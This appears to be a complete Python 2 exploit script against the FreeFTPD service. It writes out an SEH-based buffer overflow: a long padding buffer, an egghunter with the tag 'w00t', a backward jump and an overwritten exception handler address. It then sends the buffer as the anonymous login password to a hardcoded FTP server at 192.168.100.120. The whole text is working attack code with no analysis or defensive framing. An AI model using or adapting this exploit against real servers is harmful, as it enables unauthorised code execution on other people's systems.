import socket
import os
import sys
from ftplib import FTP

nSeh = "\xeb\x80\x90\x90" # Jump back 126 Bytes
Seh  = "\x26\x42\x41\x00" # 0x00414226 ASLR: False, Rebase: False, SafeSEH: False, OS: False - FreeFTPDService.exe

# Egghunter - tag =  w00t - 32 bytes
egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"


buffer  = "A" * 671
buffer += "\x90" * 15 # 126 bytes from Here to nSeh
buffer += egghunter
buffer += "B" * 79
buffer += nSeh
buffer += Seh
buffer += "D" * (5000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.120', 21)
ftp.login('anonymous', buffer)

